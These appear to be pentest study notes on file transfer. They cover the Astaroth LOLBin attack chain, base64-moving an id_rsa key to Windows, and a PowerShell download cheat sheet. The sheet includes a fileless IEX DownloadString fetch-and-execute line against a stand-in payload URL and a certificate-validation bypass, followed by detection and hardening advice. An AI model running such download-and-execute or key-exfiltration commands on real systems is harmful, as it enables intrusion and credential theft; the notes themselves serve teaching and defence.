### Astaroth attack

The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the `Userinit` process

### 🔹 Base64 Encode / Decode Concept

- **Why**: Transfer files (like SSH keys) without using direct file transfer tools. Encode → copy → decode.
    
- **Encoding on Linux**:
    
    ```bash
    cat id_rsa | base64 -w 0; echo
    ```
    
    `-w 0` = no line breaks. Output is a long Base64 string.
    
- **Decoding on Windows (PowerShell)**:
    
    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<Base64StringHere>"))
    ```
    
    - `FromBase64String()` → converts base64 string back to raw bytes.
        
    - `WriteAllBytes()` → writes those bytes to a file.
        

---

### 🔹 Hash Verification (Integrity Check)

- **Why**: Ensure the file hasn’t been corrupted during transfer.
    
- **On Linux (before transfer)**:
    
    ```bash
    md5sum id_rsa
    ```
    
- **On Windows (after transfer)**:
    
    ```powershell
    Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
    ```
    
- **Concept**: Both outputs must match → confirms file integrity.

# Short notes — PowerShell web downloads (slide / cheat-sheet friendly)

**What it is**

- PowerShell can fetch files/code over HTTP/HTTPS/FTP — convenient for admins, abused by attackers for file-based _and_ fileless payload delivery.
    

**Common APIs / methods**

- **`System.Net.WebClient`** (works in all PS versions)
    
    - `DownloadFile(uri, outPath)` — save to disk.
        
    - `DownloadFileAsync(...)` — non-blocking.
        
    - `DownloadData(...)` / `DownloadDataAsync(...)` — returns bytes.
        
    - `DownloadString(uri)` — returns string (convenient for fileless).
        
    - `OpenRead(uri)` — returns a Stream.
        
- **`Invoke-WebRequest` / `iwr`** (PowerShell 3.0+)
    
    - `Invoke-WebRequest <url> -OutFile <file>` — higher-level, but slower. Aliases: `curl`, `wget`.
        
- **Fileless pattern**
    
    - Pipe downloaded script into the interpreter: `IEX (New-Object Net.WebClient).DownloadString('<url>')` — executes in memory (no disk).
        

**Example snippets (lab use only)**

- Save file to disk: `(New-Object Net.WebClient).DownloadFile('https://example.com/payload.ps1','C:\Temp\p.ps1')`
    
- Fileless execute: `IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')`
    
- Invoke-WebRequest: `Invoke-WebRequest https://example.com/payload.ps1 -OutFile payload.ps1`
    

**Common errors & quick fixes**

- **IE first-run parsing error** with `Invoke-WebRequest` → use `-UseBasicParsing`.
    
- **SSL/TLS certificate trust errors** → observed bypass: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` — **(dangerous; insecure; for lab only)**.
    

**Why defenders care**

- Easy outbound HTTP(S) often allowed, enabling stealthy exfil/download.
    
- Fileless execution (IEX) = fewer artifacts on disk; harder to detect with simple AV.
    

**Detection & mitigation (practical defensive controls)**

- **PowerShell hardening**: enable Module/Script Block logging, transcription, and AMSI.
    
- **Execution policies** ≠ security boundary; use **AppLocker/SDDL/Windows Defender Application Control** for enforcement.
    
- **Network controls**: block/whitelist outbound domains, disallow direct internet access from endpoints, inspect HTTPS (where feasible).
    
- **Endpoint controls**: EDR to audit PowerShell child processes, command-line args, and network calls.
    
- **Hunting signals**: `IEX`, `DownloadString`, abnormal `DownloadFile` to public GitHub/raw URLs, encoded/obfuscated scripts, unusual cert-bypass code.
    
- **Least privilege & patching**: reduce user rights and keep PowerShell/OS updated.
    

**Notes / best practices**

- Treat any remote script execution as high-risk — validate sources and use signed scripts when possible.
    
- For testing: use isolated lab networks and legal, authorized scenarios.
    
- Monitor and tune detections to reduce false positives but maintain coverage for fileless patterns.
